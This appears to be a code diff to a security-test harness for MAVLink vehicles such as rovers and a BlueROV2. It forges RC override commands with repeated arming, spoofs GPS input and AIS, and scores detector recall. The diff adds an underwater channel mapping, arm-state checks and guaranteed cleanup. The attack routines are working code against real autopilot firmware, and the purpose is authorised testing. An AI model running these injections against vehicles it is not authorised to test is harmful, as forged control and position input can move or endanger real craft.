@@ -83,11 +83,18 @@ def _tap(det_suite, alerts, msg, domain):
         alerts.extend(det_suite.update(ev))
 
 
-def _ais_tap_loop(udp_addr, det_suite, alerts, stop_event):
+def _ais_tap_loop(udp_addr, det_suite, alerts, stop_event, bind_error):
     """Background thread: blind AIS tap, same shape as
     detection/run_detectors.py's ais_loop. Runs for the whole target-test
     session (not just the ais_spoof window) since a real monitor would be
-    watching continuously too."""
+    watching continuously too.
+
+    Only one process can ever hold this UDP port (SO_REUSEPORT load-balances
+    unicast traffic to ONE socket, it doesn't duplicate it -- so sharing with
+    the dashboard's own AIS listener is not possible without a relay). If the
+    dashboard already owns it, bind fails: report that via bind_error rather
+    than raising in a background thread, where it would silently produce a
+    false 0.0-recall detectability score instead of a visible error."""
     from pyais import decode
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -95,7 +102,11 @@ def _ais_tap_loop(udp_addr, det_suite, alerts, stop_event):
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
     except OSError:
         pass
-    s.bind(("127.0.0.1", udp_addr[1]))
+    try:
+        s.bind(("127.0.0.1", udp_addr[1]))
+    except OSError as e:
+        bind_error.append(str(e))
+        return
     s.settimeout(1.0)
     while not stop_event.is_set():
         try:
@@ -134,14 +145,17 @@ def connect_mavlink(cfg):
 def snapshot_state(conn, settle_s, det_suite, alerts, domain):
     """Samples the target's own telemetry for settle_s seconds. Returns the
     "before" baseline every vulnerability check compares against: believed
-    lat/lon, mode, armed state, and the latest SERVO_OUTPUT_RAW seen
-    (channels 1/3, the rover steering/throttle convention used elsewhere in
-    this project). Every message seen is also tapped for detectability."""
+    lat/lon, mode, armed state, and the latest SERVO_OUTPUT_RAW seen. Baselines
+    servo1/servo3 (Rover steering/throttle convention, surface) AND servo5
+    (ArduSub's vertical-thrust output, underwater -- see
+    run_c2_rc_override_test's docstring for how this was determined) so both
+    domains' RC-override checks have what they need without a second sampling
+    pass. Every message seen is also tapped for detectability."""
     conn.mav.request_data_stream_send(conn.target_system, conn.target_component,
                                        mavutil.mavlink.MAV_DATA_STREAM_ALL, 10, 1)
     mode_map = {v: k for k, v in conn.mode_mapping().items()} if conn.mode_mapping() else {}
     baseline = {"lat": None, "lon": None, "mode": None, "armed": None,
-                "servo1": None, "servo3": None, "heartbeats": 0, "mode_map": mode_map}
+                "servo1": None, "servo3": None, "servo5": None, "heartbeats": 0, "mode_map": mode_map}
     end = time.time() + settle_s
     while time.time() < end:
         msg = conn.recv_match(blocking=True, timeout=1)
@@ -156,8 +170,14 @@ def snapshot_state(conn, settle_s, det_suite, alerts, domain):
             baseline["mode"] = mode_map.get(msg.custom_mode, str(msg.custom_mode))
             baseline["heartbeats"] += 1
         elif mt == "SERVO_OUTPUT_RAW":
-            baseline["servo1"], baseline["servo3"] = msg.servo1_raw, msg.servo3_raw
+            baseline["servo1"], baseline["servo3"], baseline["servo5"] = \
+                msg.servo1_raw, msg.servo3_raw, msg.servo5_raw
     return baseline
+
+
+_log_lock = threading.Lock()  # ais_spoof's ghost + impersonate loops both log
+                               # to the same file concurrently from separate
+                               # threads -- serialize the header-check/write.
 
 
 def _log_ground_truth(out_dir, filename, wall_ts, attack_type, description):
@@ -167,12 +187,13 @@ def _log_ground_truth(out_dir, filename, wall_ts, attack_type, description):
     doesn't apply here since the RC-override sub-check logs its own duration
     the same way attacks/c2_replay.py does)."""
     path = os.path.join(out_dir, filename)
-    write_header = not os.path.exists(path)
-    with open(path, "a", newline="") as f:
-        w = csv.writer(f)
-        if write_header:
-            w.writerow(["wall_ts", "attack_type", "description"])
-        w.writerow([wall_ts, attack_type, description])
+    with _log_lock:
+        write_header = not os.path.exists(path)
+        with open(path, "a", newline="") as f:
+            w = csv.writer(f)
+            if write_header:
+                w.writerow(["wall_ts", "attack_type", "description"])
+            w.writerow([wall_ts, attack_type, description])
 
 
 # --- C2 replay: two independent vulnerability sub-checks ---------------------
@@ -243,27 +264,26 @@ def run_c2_rc_override_test(conn, target_cfg, baseline, out_dir, det_suite, aler
     vehicle can move under ANY command before it's treated as a real
     security finding.
 
-    CHANNEL MAPPING IS ROVER-SPECIFIC (confirmed 2026-08-07): this check
-    sends chan1=steering/chan3=throttle and reads back servo3 -- the
-    ArduRover convention used throughout this project. ArduSub's 6-DOF
-    vectored-thruster mapping is different and unvalidated here (an
-    underwater test came back RESILIENT with servo3 never moving, but
-    RC_CHANNELS still echoed the override and the detector correctly fired
-    on it -- i.e. the override DID register, just not on a channel this
-    check happens to read for its own verdict). Rather than risk a false
-    RESILIENT, this returns INCONCLUSIVE for domain=underwater until a
-    validated ArduSub channel/servo mapping is added.
+    CHANNEL MAPPING IS DOMAIN-SPECIFIC (surface validated originally;
+    underwater mapping validated 2026-08-08). Both domains send
+    chan1=steering, chan3=throttle -- chan3 (RCMAP_THROTTLE) already drove
+    ArduSub's vertical thrust correctly (this project's own WO-19 finding:
+    it moved the AUV's TRUE depth +8.25m), so the send side was never the
+    problem. What was wrong is what got READ BACK for verification: surface
+    (Rover) watches servo3 (its steering/throttle passthrough channel), but
+    an empirical RC-channel sweep against a live BlueROV2 (all 8 channels,
+    one at a time, watching all 8 SERVO_OUTPUT_RAW channels) showed chan3
+    drives servo5 and servo6 together (ArduSub's vectored-frame vertical
+    thruster pair) -- servo3 never moves for this vehicle at all, which is
+    exactly why the underwater check used to see "armed + override sent,
+    servo3 flat" and (correctly, at the time) refused to call that
+    RESILIENT. Underwater now watches servo5, the validated channel.
     """
     domain = target_cfg["domain"]
     ccfg = target_cfg["attacks"]["c2_replay"]
     if not ccfg.get("allow_arm_and_actuate"):
         return "N/A", {"reason": "allow_arm_and_actuate is false (default) -- skipped"}
-    if domain == "underwater":
-        return "INCONCLUSIVE", {"reason": "this check's channel/servo mapping (chan1/chan3, servo3) is validated "
-                                           "for Rover-style vehicles only -- ArduSub's thruster layout is different "
-                                           "and unvalidated here, so a RESILIENT/VULNERABLE verdict would not be "
-                                           "trustworthy. Needs a validated ArduSub channel mapping before this "
-                                           "sub-check is meaningful for underwater targets."}
+    watched_servo = "servo5" if domain == "underwater" else "servo3"
 
     thr = ccfg.get("rc_throttle_pwm", 1700)
     steer = ccfg.get("rc_steering_pwm", 1500)
@@ -295,7 +315,35 @@ def run_c2_rc_override_test(conn, target_cfg, baseline, out_dir, det_suite, aler
             if bool(msg.base_mode & mavutil.mavlink.MAV_MODE_FLAG_SAFETY_ARMED):
                 armed = True
 
-    pre_servo3 = baseline.get("servo3")
+    # Arming can succeed then immediately auto-disarm again within ~1s
+    # (confirmed 2026-08-08, live against BlueROV2: a GCS/RC-failsafe race,
+    # reproduced independently of this attack -- happens even with nothing
+    # but repeated arm commands and no override at all). A single "confirmed
+    # armed" heartbeat is therefore not enough to trust; require it to STAY
+    # armed across 2 consecutive heartbeats (keep re-arming meanwhile) before
+    # spending the actual injection window, so `duration` measures a genuinely
+    # armed vehicle instead of racing an unstable arm state.
+    if armed:
+        consecutive_armed = 0
+        last_arm_cmd = 0.0
+        stab_end = time.time() + 8.0
+        while time.time() < stab_end and consecutive_armed < 2:
+            if time.time() - last_arm_cmd > 1.0:
+                conn.mav.command_long_send(conn.target_system, conn.target_component,
+                    mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0, 1, 0, 0, 0, 0, 0, 0)
+                last_arm_cmd = time.time()
+            msg = conn.recv_match(blocking=True, timeout=0.5)
+            if msg is None:
+                continue
+            _tap(det_suite, alerts, msg, domain)
+            if msg.get_type() == "HEARTBEAT" and msg.type != mavutil.mavlink.MAV_TYPE_GCS:
+                if bool(msg.base_mode & mavutil.mavlink.MAV_MODE_FLAG_SAFETY_ARMED):
+                    consecutive_armed += 1
+                else:
+                    consecutive_armed = 0
+        armed = consecutive_armed >= 2
+
+    pre_val = baseline.get(watched_servo)
 
     # Send the override AND watch SERVO_OUTPUT_RAW in the same loop --
     # attacks/c2_replay.py's inject_forged_rc_override() is a blocking call
@@ -306,36 +354,92 @@ def run_c2_rc_override_test(conn, target_cfg, baseline, out_dir, det_suite, aler
     # mid-window). Reimplementing the send loop inline, rather than calling
     # that helper, is what makes concurrent observation (and tapping)
     # possible.
+    #
+    # Keep re-sending the arm command through this whole loop too (confirmed
+    # 2026-08-08, live against BlueROV2): ArduSub can arm, then auto-disarm
+    # again within ~1s (a GCS/RC-failsafe race, independent of this attack --
+    # it happens even sending nothing but repeated arm commands with no
+    # override at all), so a single "confirmed armed" check BEFORE this loop
+    # is not sufficient evidence the vehicle was actually armed while the
+    # override was being sent. `armed_during_injection` tracks the latest
+    # heartbeat's armed bit live through the whole window, and a re-arm
+    # command every ~1s recovers quickly if it drops.
     t_inject = time.time()
     _log_ground_truth(out_dir, "c2_replay_ground_truth.csv", t_inject, "inject_rc_override",
                        f"throttle={thr}, steering={steer}, {duration}s")
-    peak_servo3 = pre_servo3
-    end = time.time() + duration
-    while time.time() < end:
-        conn.mav.rc_channels_override_send(conn.target_system, conn.target_component,
-                                            steer, 0, thr, 0, 0, 0, 0, 0)
-        msg = conn.recv_match(blocking=False)
-        if msg is not None:
-            _tap(det_suite, alerts, msg, domain)
-            if msg.get_type() == "SERVO_OUTPUT_RAW" and (
-                    peak_servo3 is None or abs(msg.servo3_raw - (pre_servo3 or 1500)) >
-                    abs(peak_servo3 - (pre_servo3 or 1500))):
-                peak_servo3 = msg.servo3_raw
-        time.sleep(0.1)
-    # release override (all-zero == "ignore", matches c2_replay.py's convention)
-    conn.mav.rc_channels_override_send(conn.target_system, conn.target_component, 0, 0, 0, 0, 0, 0, 0, 0)
+    peak_val = pre_val
+    ever_armed_during_injection = False  # only set True by a heartbeat actually received INSIDE this loop
+    last_arm_cmd = 0.0
+    try:
+        end = time.time() + duration
+        while time.time() < end:
+            conn.mav.rc_channels_override_send(conn.target_system, conn.target_component,
+                                                steer, 0, thr, 0, 0, 0, 0, 0)
+            # Unconditionally keep re-arming every ~1s regardless of last-known
+            # state -- cheap/idempotent while already armed, and doesn't wait
+            # for a heartbeat to first PROVE disarmed (which would burn part
+            # of the fixed injection window reacting after the fact).
+            if time.time() - last_arm_cmd > 1.0:
+                conn.mav.command_long_send(conn.target_system, conn.target_component,
+                    mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0, 1, 0, 0, 0, 0, 0, 0)
+                last_arm_cmd = time.time()
+            # Drain EVERY currently-queued message, not just one -- at 10Hz
+            # SERVO_OUTPUT_RAW vs 1Hz HEARTBEAT, popping a single message per
+            # iteration can starve the rarer HEARTBEAT out of ever being seen
+            # even while genuinely armed (confirmed 2026-08-08: a run showed
+            # the watched servo clearly move -- which ArduPilot only does
+            # while armed, by design -- yet no HEARTBEAT was ever dequeued to
+            # confirm it, a false INCONCLUSIVE caused by under-draining, not
+            # by the vehicle's actual state).
+            while True:
+                msg = conn.recv_match(blocking=False)
+                if msg is None:
+                    break
+                _tap(det_suite, alerts, msg, domain)
+                mt = msg.get_type()
+                if mt == "SERVO_OUTPUT_RAW":
+                    val = getattr(msg, f"{watched_servo}_raw")
+                    if peak_val is None or abs(val - (pre_val or 1500)) > abs(peak_val - (pre_val or 1500)):
+                        peak_val = val
+                elif mt == "HEARTBEAT" and msg.type != mavutil.mavlink.MAV_TYPE_GCS:
+                    if bool(msg.base_mode & mavutil.mavlink.MAV_MODE_FLAG_SAFETY_ARMED):
+                        ever_armed_during_injection = True
+            time.sleep(0.1)
+    finally:
+        # release override (all-zero == "ignore", matches c2_replay.py's
+        # convention) -- MUST run even if recv_match/send raises mid-loop
+        # (e.g. the target drops the connection under the attack), otherwise
+        # a forged override is left active on a target we don't control.
+        try:
+            conn.mav.rc_channels_override_send(conn.target_system, conn.target_component, 0, 0, 0, 0, 0, 0, 0, 0)
+        except Exception:
+            pass
 
-    evidence = {"armed_confirmed": armed, "pre_servo3": pre_servo3, "peak_servo3_during_injection": peak_servo3,
+    evidence = {"armed_confirmed": armed, "armed_during_injection": ever_armed_during_injection,
+                "watched_channel": watched_servo,
+                f"pre_{watched_servo}": pre_val, f"peak_{watched_servo}_during_injection": peak_val,
                 "forged_throttle_pwm": thr}
 
     if not armed:
         evidence["reason"] = "target did not confirm ARMED after the arm sequence -- preconditions not met"
         return "INCONCLUSIVE", evidence
-    if pre_servo3 is None or peak_servo3 is None:
-        evidence["reason"] = "never observed a SERVO_OUTPUT_RAW message -- can't compare"
+    if pre_val is None or peak_val is None:
+        evidence["reason"] = f"never observed a SERVO_OUTPUT_RAW message for {watched_servo} -- can't compare"
         return "INCONCLUSIVE", evidence
-    if abs(peak_servo3 - pre_servo3) > 100:
+    # Movement beyond the threshold is itself conclusive proof the vehicle was
+    # armed and received the override (ArduPilot ignores RC_CHANNELS_OVERRIDE
+    # while disarmed, by design) -- check this BEFORE the armed_during_injection
+    # gate below, since that gate only matters when nothing moved and the
+    # ambiguity between "resisted it" and "wasn't armed to receive it" is real.
+    if abs(peak_val - pre_val) > 100:
         return "VULNERABLE", evidence
+    if not ever_armed_during_injection:
+        evidence["reason"] = ("target confirmed ARMED before the override, but was never seen armed DURING the "
+                               "injection window -- it auto-disarmed (a known ArduPilot GCS/RC-failsafe race, "
+                               "reproduced independently of this attack) before or during the send loop. A flat "
+                               "servo reading here is not evidence of resilience, it's evidence the vehicle "
+                               "wasn't actually armed to receive the command; not a security result.")
+        return "INCONCLUSIVE", evidence
     evidence["caveat"] = (
         "armed confirmed and RC override sent, but servo output did not move. Candidate causes, "
         "most to least likely: (1) the target's SYSID_MYGCS does not match the source_system used "
@@ -530,18 +634,26 @@ def run_gps_spoof_fdm_relay(conn, target_cfg, out_dir, det_suite, alerts):
     _log_ground_truth(out_dir, "gps_spoof_ground_truth.csv", t_inject, profile, f"fdm_relay {profile}")
 
     peak_delta = 0.0
-    end = time.time() + window_s
-    while time.time() < end:
-        msg = conn.recv_match(blocking=True, timeout=1)
-        if msg is None:
-            continue
-        _tap(det_suite, alerts, msg, domain)
-        if msg.get_type() == "GLOBAL_POSITION_INT" and not (msg.lat == 0 and msg.lon == 0) and pre_lat is not None:
-            lat, lon = msg.lat / 1e7, msg.lon / 1e7
-            peak_delta = max(peak_delta, _horiz_m(pre_lat, pre_lon, lat, lon))
-
-    with open(fifo, "w") as f:
-        f.write("off\n")
+    try:
+        end = time.time() + window_s
+        while time.time() < end:
+            msg = conn.recv_match(blocking=True, timeout=1)
+            if msg is None:
+                continue
+            _tap(det_suite, alerts, msg, domain)
+            if msg.get_type() == "GLOBAL_POSITION_INT" and not (msg.lat == 0 and msg.lon == 0) and pre_lat is not None:
+                lat, lon = msg.lat / 1e7, msg.lon / 1e7
+                peak_delta = max(peak_delta, _horiz_m(pre_lat, pre_lon, lat, lon))
+    finally:
+        # MUST turn the relay off even if recv_match raises mid-window (e.g.
+        # the target drops the connection under the spoof) -- the relay is a
+        # separate, long-lived process shared with the target's own boot
+        # sequence, so leaving it stuck injecting would outlive this run.
+        try:
+            with open(fifo, "w") as f:
+                f.write("off\n")
+        except OSError:
+            pass
 
     expected = gcfg.get("step_offset_m", 50.0) if profile == "step" else gcfg.get("ramp_rate_m_per_s", 0.5) * window_s
     return _gps_verdict(peak_delta, expected, pre_lat is not None, pre_lat is not None,
@@ -572,58 +684,62 @@ def run_gps_spoof_gps_input(conn, target_cfg, out_dir, det_suite, alerts):
                                     args=(conn, lat0, lon0, alt0, state, gps_id, stop), daemon=True)
     feed_thread.start()
 
-    # Phase 1: establish an unspoofed fix for a few seconds (models a target
-    # that's already GPS-locked, real or via a legitimate feed on the same
-    # channel) and record BOTH the raw (pre-fusion) and fused baseline
-    # positions before judging anything.
-    raw_lat0 = raw_lon0 = None
-    fused_lat0 = fused_lon0 = None
-    end = time.time() + 5.0
-    while time.time() < end:
-        msg = conn.recv_match(blocking=True, timeout=1)
-        if msg is None:
-            continue
-        _tap(det_suite, alerts, msg, domain)
-        mt = msg.get_type()
-        if mt == "GPS_RAW_INT" and msg.lat != 0:
-            raw_lat0, raw_lon0 = msg.lat / 1e7, msg.lon / 1e7
-        elif mt == "GLOBAL_POSITION_INT" and not (msg.lat == 0 and msg.lon == 0):
-            fused_lat0, fused_lon0 = msg.lat / 1e7, msg.lon / 1e7
+    # Everything below is wrapped in try/finally: if conn.recv_match raises
+    # mid-loop (e.g. the target drops the connection under the spoof), the
+    # feed thread MUST still be stopped -- otherwise it keeps sending forged
+    # GPS_INPUT on this conn indefinitely, corrupting whatever runs next.
+    try:
+        # Phase 1: establish an unspoofed fix for a few seconds (models a
+        # target that's already GPS-locked, real or via a legitimate feed on
+        # the same channel) and record BOTH the raw (pre-fusion) and fused
+        # baseline positions before judging anything.
+        raw_lat0 = raw_lon0 = None
+        fused_lat0 = fused_lon0 = None
+        end = time.time() + 5.0
+        while time.time() < end:
+            msg = conn.recv_match(blocking=True, timeout=1)
+            if msg is None:
+                continue
+            _tap(det_suite, alerts, msg, domain)
+            mt = msg.get_type()
+            if mt == "GPS_RAW_INT" and msg.lat != 0:
+                raw_lat0, raw_lon0 = msg.lat / 1e7, msg.lon / 1e7
+            elif mt == "GLOBAL_POSITION_INT" and not (msg.lat == 0 and msg.lon == 0):
+                fused_lat0, fused_lon0 = msg.lat / 1e7, msg.lon / 1e7
 
-    if raw_lat0 is None:
+        if raw_lat0 is None:
+            return _gps_verdict(None, 1.0, False, False, {"method": "gps_input", "gps_id": gps_id})
+
+        t_inject = time.time()
+        state.mode = profile
+        state.start_time = t_inject
+        state.active = True
+        _log_ground_truth(out_dir, "gps_spoof_ground_truth.csv", t_inject, profile, f"gps_input {profile} gps_id={gps_id}")
+
+        # Track raw (pre-fusion, i.e. did the forged value even reach the
+        # wire) and fused (post-EKF, i.e. did the vehicle's BELIEF actually
+        # move) divergence SEPARATELY -- this is what distinguishes "the EKF
+        # genuinely rejected the spoof" (raw moves, fused doesn't --
+        # RESILIENT) from "the injection itself never took effect" (neither
+        # moves -- a tool bug, not a security finding) rather than guessing
+        # from the fused delta alone.
+        raw_peak_delta = 0.0
+        fused_peak_delta = 0.0
+        end = time.time() + window_s
+        while time.time() < end:
+            msg = conn.recv_match(blocking=True, timeout=1)
+            if msg is None:
+                continue
+            _tap(det_suite, alerts, msg, domain)
+            mt = msg.get_type()
+            if mt == "GPS_RAW_INT" and msg.lat != 0:
+                raw_peak_delta = max(raw_peak_delta, _horiz_m(raw_lat0, raw_lon0, msg.lat / 1e7, msg.lon / 1e7))
+            elif mt == "GLOBAL_POSITION_INT" and not (msg.lat == 0 and msg.lon == 0) and fused_lat0 is not None:
+                fused_peak_delta = max(fused_peak_delta, _horiz_m(fused_lat0, fused_lon0, msg.lat / 1e7, msg.lon / 1e7))
+    finally:
+        state.active = False
         stop.set()
         feed_thread.join(timeout=2)
-        return _gps_verdict(None, 1.0, False, False, {"method": "gps_input", "gps_id": gps_id})
-
-    t_inject = time.time()
-    state.mode = profile
-    state.start_time = t_inject
-    state.active = True
-    _log_ground_truth(out_dir, "gps_spoof_ground_truth.csv", t_inject, profile, f"gps_input {profile} gps_id={gps_id}")
-
-    # Track raw (pre-fusion, i.e. did the forged value even reach the wire)
-    # and fused (post-EKF, i.e. did the vehicle's BELIEF actually move)
-    # divergence SEPARATELY -- this is what distinguishes "the EKF genuinely
-    # rejected the spoof" (raw moves, fused doesn't -- RESILIENT) from "the
-    # injection itself never took effect" (neither moves -- a tool bug, not
-    # a security finding) rather than guessing from the fused delta alone.
-    raw_peak_delta = 0.0
-    fused_peak_delta = 0.0
-    end = time.time() + window_s
-    while time.time() < end:
-        msg = conn.recv_match(blocking=True, timeout=1)
-        if msg is None:
-            continue
-        _tap(det_suite, alerts, msg, domain)
-        mt = msg.get_type()
-        if mt == "GPS_RAW_INT" and msg.lat != 0:
-            raw_peak_delta = max(raw_peak_delta, _horiz_m(raw_lat0, raw_lon0, msg.lat / 1e7, msg.lon / 1e7))
-        elif mt == "GLOBAL_POSITION_INT" and not (msg.lat == 0 and msg.lon == 0) and fused_lat0 is not None:
-            fused_peak_delta = max(fused_peak_delta, _horiz_m(fused_lat0, fused_lon0, msg.lat / 1e7, msg.lon / 1e7))
-
-    state.active = False
-    stop.set()
-    feed_thread.join(timeout=2)
 
     expected = state.step_offset_m if profile == "step" else state.ramp_rate_m_per_s * window_s
     ingestion_confirmed = raw_peak_delta >= 0.6 * expected
@@ -662,14 +778,31 @@ def run_target_test(target_name, requested_attacks=None):
 
     enabled = target.get("attacks", {})
     to_run = requested_attacks or [a for a in enabled if enabled[a].get("enabled")]
+    # An attack named explicitly via --attacks is still gated on the target
+    # config's own "enabled" flag below (e.g. gps_spoof/ais_spoof are
+    # deliberately disabled+N/A for some underwater targets) -- without this,
+    # `--attacks gps_spoof` against such a target silently produced no
+    # verdict entry and no explanation at all. Say so.
+    for a in to_run:
+        if not enabled.get(a, {}).get("enabled"):
+            reason = enabled.get(a, {}).get("reason", "not enabled in this target's config")
+            print(f"[test_target] skipping '{a}' (requested but disabled for this target): {reason}")
 
     ais_stop = threading.Event()
     ais_thread = None
+    ais_bind_error = []
     if "ais_spoof" in to_run and enabled.get("ais_spoof", {}).get("enabled"):
         udp_addr = tuple(enabled["ais_spoof"].get("udp_addr", ["127.0.0.1", 10110]))
-        ais_thread = threading.Thread(target=_ais_tap_loop, args=(udp_addr, det_suite, alerts, ais_stop), daemon=True)
+        ais_thread = threading.Thread(target=_ais_tap_loop, args=(udp_addr, det_suite, alerts, ais_stop, ais_bind_error), daemon=True)
         ais_thread.start()
-        print(f"[test_target] AIS detectability tap listening on {udp_addr}")
+        time.sleep(0.2)  # let a bind failure surface before claiming the tap is listening
+        if ais_bind_error:
+            print(f"[test_target] WARNING: AIS detectability tap could not bind {udp_addr}: "
+                  f"{ais_bind_error[0]} -- likely the dashboard (run_demo.sh) is already listening "
+                  f"there. ais_spoof detectability below will be unreliable (not a real 0.0); "
+                  f"re-run headless via run_vehicle.sh for an accurate score.")
+        else:
+            print(f"[test_target] AIS detectability tap listening on {udp_addr}")
 
     print(f"[test_target] connected, sampling baseline for {target['timing']['settle_s']}s ...")
     baseline = snapshot_state(conn, target["timing"]["settle_s"], det_suite, alerts, target["domain"])
@@ -711,6 +844,10 @@ def run_target_test(target_name, requested_attacks=None):
             f.write(json.dumps(a.as_dict()) + "\n")
     detectability = score_alerts(alerts_path, gt_dir=out_dir)
     results["detectability"] = detectability
+    if ais_bind_error:
+        results["warnings"] = [f"AIS detectability tap could not bind udp {udp_addr} ({ais_bind_error[0]}) -- "
+                                f"ais_spoof recall below is not a real measurement, another process "
+                                f"(likely the dashboard) already owned that port."]
     print(f"[test_target] detectability: {json.dumps({k: v['recall'] for k, v in detectability['families'].items()})}")
 
     out_path = os.path.join(out_dir, "verdicts.json")
